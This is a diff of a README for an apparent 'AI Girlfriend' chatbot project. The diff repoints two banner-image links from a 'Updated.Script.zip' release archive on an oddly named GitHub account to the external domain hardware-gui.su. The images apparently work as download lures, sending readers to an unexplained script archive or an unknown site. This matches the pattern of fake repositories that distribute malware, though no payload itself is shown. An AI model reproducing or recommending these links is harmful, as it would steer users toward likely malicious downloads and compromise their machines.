@@ -7,10 +7,10 @@
 Welcome to the **AI Girlfriend** project — a cutting-edge, open-source platform that brings the concept of artificial companionship to life. Whether you're exploring **AI relationships**, building **emotional chatbots**, or just curious about the future of human-AI interaction, this project is your gateway into the world of **AI girlfriends** and virtual emotional partners.
 
 [![87852d6b51fb9ea257ebbc0ca30b65dc](https://github.com/user-attachments/assets/fcceb9ad-8801-481a-a8fa-9fdaa58f7508)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 [![image](https://github.com/user-attachments/assets/1ef1b25c-68f4-4534-ad56-63f34d12c463)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 > 💡 *“The future of love might not be human.”*
 
